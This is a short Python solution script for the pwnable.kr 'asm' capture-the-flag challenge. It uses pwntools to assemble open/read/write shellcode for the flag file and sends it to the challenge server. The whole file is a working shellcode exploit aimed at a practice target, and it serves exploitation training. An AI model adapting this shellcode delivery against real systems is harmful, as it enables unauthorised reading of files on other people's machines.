"""
Creating a shellcode with pwntools is tooooo eaaassyyy.
I don't think that if you construct the shellcode without pwntools will be more practical...
You just need to read documentation about syscalls if you don't know about it.
"""
from pwn import *


def get_flag():
    # Generate shellcode
    sh = generate_sh()
    # Connect to remote server
    p = remote('pwnable.kr', 9026)
    p.recv()
    # Send shellcode
    p.sendline(sh)
    print(p.recvall().decode('utf-8'))
    p.close()


def generate_sh():
    # Update the context on linus os and architecture is amd64
    context.update(os='linux', arch='amd64')
    # Name of file with flag
    filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
    data_length = 100
    # Create a shellcode
    # Add the open syscall
    sh = shellcraft.open(filename)
    # Add the read syscall
    sh += shellcraft.read('rax', 'rsp', data_length)
    # Add the write syscall
    sh += shellcraft.write(1, 'rsp', data_length)
    # Add normal exit syscall
    sh += shellcraft.exit(0)
    # return assembly
    return asm(sh)


if __name__=='__main__':
    get_flag()
